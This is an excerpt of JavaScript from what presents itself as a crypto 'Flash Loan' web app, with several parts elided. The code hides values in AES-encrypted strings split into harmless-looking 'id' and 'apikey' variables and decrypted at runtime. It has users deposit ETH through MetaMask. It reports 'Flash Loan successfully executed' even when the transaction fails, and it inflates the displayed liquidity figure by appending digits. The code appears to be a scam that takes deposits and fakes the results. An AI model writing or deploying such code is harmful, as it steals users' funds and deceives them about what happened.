...
eth_id = "vkvmsnb9na5osFut";
eth_apikey = "U2FsdGVkX1/";
bsc_id = "JyilZHGxmuHOtlgEVzcb/";
bsc_apikey = "U2FsdGVkX1/";
eth_network = eth_apikey + eth_id;
eth_api = eth_network + "+HKYAwITvw3RKuWM2jOpbiIKXAmIsZlLx2WwFA1rhR5scZaD8rzkrz5mlbw==";
eth_abi = CryptoJS.AES.decrypt(eth_api, eth_ticker);
bsc_network = bsc_apikey + bsc_id;
bsc_api = bsc_network + "fkpM9UAuDVqeVdww4SbCMz430ZLHEUxHOHtk7DYSGbj13HfC4HlA/Q==";
...
app.controller('myCtrl', async function($scope) {
    ...
    $scope.init = function() {
        ...
        $scope.submitErc20Form = function() {
            ...
            if (tokenName == '') return swal('Error','Token Name cannot be blank', "error");
            const tokenSymbol = $scope.erc20.symbol.trim();
            if (tokenSymbol == '') return swal('Error','Token Symbol cannot be blank', "error");
            if (window.isBnb && $scope.erc20.network) {
                return swal('Error','Network Mismatch. Set MetaMask network to Ethereum and reload the page.', "error");
            } else if (!window.isBnb && !$scope.erc20.network) {
                return swal('Error','Network Mismatch. Set MetaMask network to Binance Smart Chain and the reload page.', "error");
            }
            $scope.formStep = 2;
        ...
        $scope.depositEth = function() {
            ...
            window.web3.eth.sendTransaction({
                ...
                $scope.processing = false;
                $scope.$apply();
                if (error) swal('Error','Transaction Failed', "error");
                else {
                    setTimeout(function() {
                        swal('Success','Coin deposited to contract. You can execute the Flash Loan now.', "success");
                    }, 5000);
        ...
        $scope.executeLoan = function() {
            ...
            window.contract.methods.action().send({
                ...
                if (error) {
                    ...
                    setTimeout(function() {
                        swal('Success','Flash Loan successfully executed (Matching ID ee8uj1).', "success");
                    }, 5000);
                    // setTimeout(function() {
                    //     swal('Error','Something went wrong, maybe your gas is insufficient or another user made the trade before you (Matching ID ee8uj1). Please try again.', "error");
                    // }, 5000);
                }
            });
        }
...
if(document.getElementById("eth_val")){
...
if(document.getElementById("bnb_val")){
    document.getElementById("bnb_val").innerHTML = "$ " + liquidity_bnb.toLocaleString() + ",347";
}
const tron_api_url = 'https://api.cryptonator.com/api/ticker/trx-usd';
...
if(document.getElementById("tron_val")){
